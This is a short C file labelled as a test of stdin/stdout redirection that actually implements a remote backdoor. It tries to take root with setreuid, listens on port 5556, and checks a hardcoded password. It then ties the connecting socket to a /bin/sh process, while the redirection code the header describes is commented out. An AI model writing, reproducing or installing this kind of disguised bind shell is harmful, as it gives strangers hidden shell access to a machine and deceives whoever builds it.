/*
 * =====================================================================================
 *
 *       Filename:  test.c
 *
 *    Description:  For Test IO-Redict by freopen a new file for stdin and
 *    stdout
 *
 *        Version:  1.0
 *        Created:  2015年06月13日 22时09分11秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  ExiaHan 
 *   Organization:  USTC
 *
 * =====================================================================================
 */
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <error.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <arpa/inet.h>

#define STDIN 0
#define STDOUT 1
#define PORT 5556
#define MAXBUF 50

typedef struct sockaddr_in SockAddrIn;
typedef struct sockaddr SockAddr;

static char *passwd = "hihiohayou";
static char *wel = "Welcome!\n";
static char *acdeny = "Access Deny!\n";

int main(int argc, char **argv)
{
    int sockfd, cliSockfd, in, out;
    int pid, res, addrlen;
    void *pStdOut;
    SockAddrIn scSockServer, scSockClient;
    char strBuf[MAXBUF];

    setreuid(0, 0);

    bzero(&scSockServer, sizeof(scSockServer));
    scSockServer.sin_family = AF_INET;
    scSockServer.sin_addr.s_addr = htonl(INADDR_ANY);
    scSockServer.sin_port = htons(PORT);

    addrlen = sizeof(scSockClient);
    
		
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if (sockfd == -1) {
		printf("[E]: Can not create socket\n");
		return -1;
	}

	if (bind(sockfd, (SockAddr *)(&scSockServer), sizeof(SockAddr)) == -1) {
		printf("[E]: Error when bind socket [%d] [%s]\n", errno, strerror(errno));
		return -2;
	}
		
	if (listen(sockfd, SOMAXCONN) == -1) {
		printf("[E]: Error When listen\n");
		return -3;
	}
    /*************************************
     * Just For Test I/O Redirect
     *************************************/
    /*if(!(iStdin = freopen("./in", "r", stdin))) {
        printf("[E]: Error When Change Stdin\n");
        return -1;
    }
    if (!(pStdOut = freopen("./out", "w+", stdout))) {
        printf("[E]: Error When Change Stdout\n");
        return -2;
    }
    */
    while (1) {		
        if ((cliSockfd = accept(sockfd, (SockAddr *)(&scSockClient), &addrlen)) == -1) {
            printf("[E]: Error When accept\n");
            return -4;
        }

        read(cliSockfd, strBuf, MAXBUF);
        if (strncmp(strBuf, passwd, strlen(passwd)) != 0) {
            write(cliSockfd, acdeny, strlen(acdeny));
            close(cliSockfd);
            continue;
        }
        write(cliSockfd, wel, strlen(wel));

        if (!(pid = fork())) {
            if ((in = dup2(cliSockfd, STDIN)) == -1) {//标准输出重定向到客户机socket
                printf("[E]: Error When change stdin to socket\n");
                return -1;
            }

            if ((out = dup2(cliSockfd, STDOUT) == -1)) {//标准输入重定向到客户机socket
                printf("[E]: Error When change stdout to socket\n");
                return -2;
            }
    
            execv("/bin/sh", NULL);
        }
        wait(&res);
    }
    return 0;
}
